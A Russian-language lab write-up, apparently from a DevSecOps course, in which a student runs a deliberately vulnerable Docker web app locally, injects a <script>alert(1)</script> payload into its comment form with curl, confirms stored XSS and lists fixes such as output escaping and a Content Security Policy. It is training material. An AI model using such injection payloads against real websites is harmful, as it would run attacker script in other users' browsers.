ЛАБОРАТОРНАЯ РАБОТА 5 СИМУЛЯЦИЯ XSS АТАКИ

Попробуем провести XSS атаку и посмотреть, что JS выполняется в контексте браузера клиента


1. Сначала запустим докер конетейнер командой из описания лабы

    docker pull ket9/otus-devsecops-xss:latest
    docker run -d --name owasp-xss-lab -p 8080:80 ket9/otus-devsecops-xss:latest


    Сходим курлом на локалхост и провериим работоспособность контейнера 

    curl -i -s http://localhost:8080/


    главная страница отдает Otus XSS lab и ссылку на XSS-1

    все ок, начнем тестировать и проверять уязвимости 

2. Проверим функциогнал на локалхосте: 
    curl -i -s http://localhost:8080/XSS-1/

    На странице есть HTML форма: method POST action indexphp поле name=comment и save data

    Потенциальная точка входа для xss уязвимости это поле comment, будем отталкиваться отсюда 

4. Проверим ввод в форму и отображение на главной странице 

    curl -i -s -X POST http://localhost:8080/XSS-1/index.php -d 'comment=pupupu&submit=Save+Data'
    curl -i -s http://localhost:8080/XSS-1/index.php


    Видим что pupupu сохранился и отображается в блоке комментариев 

    Данные сохраняются и отрисовываются в форме 

5. Пытаемся XSS


    curl -i -s -X POST http://localhost:8080/XSS-1/index.php -d 'text=%3Cscript%3Ealert(9)%3C%2Fscript%3E&submit=Save+Data'
    Вывод -  wrong_param_payload_present=False
    Видимо параметр text не обрабатывается

    Пробуем через коммент:
        curl -i -s -X POST http://localhost:8080/XSS-1/index.php -d 'comment=%3Cscript%3Ealert(1)%3C%2Fscript%3E&submit=Save+Data'
        curl -s http://localhost:8080/XSS-1/index.php


    В хтмл ответе комментарий вставлен без экранирования - <script>alert(1)</script> те воспринимается буквально как код а не текст 
    </p><hr />
        <p>

        <script>alert(1)</script>

        </p><hr />
        <p>

    => xss подтверждена 

    
те если открыть страницу в браузере, тег script будет интерпретирован движком JS и alert выполнится в контексте страницы

ВЫВОДЫ:
    Найдена уязвимость в форме комментариев ё
    те скрипт пользователя сохраняется и возвращается в ответе как активныйк код 

    Cross Site Scripting Stored XSS

    Как исправить?

        1 Контекстное экранирование вывода. Перед вставкой пользовательского текста в хтмл нужно преобразовывать специальные символы чтобы строка отображалась текстом а не кодом

        2 Санитизация входа: удалять всякие теги и опасные конструкции в силу безопасности 

        3 Ограничение формата данных: чтобы в комментариимпопадал только текст, можно сделать ограничение длины и тд
 
        4 Включить Content Security Policy с запретом inline script
       
        Как можно заметить по этой лабе - отсутствие экранирования приводит к Stored XSS
        Надо экранировать и регламентировать ввод
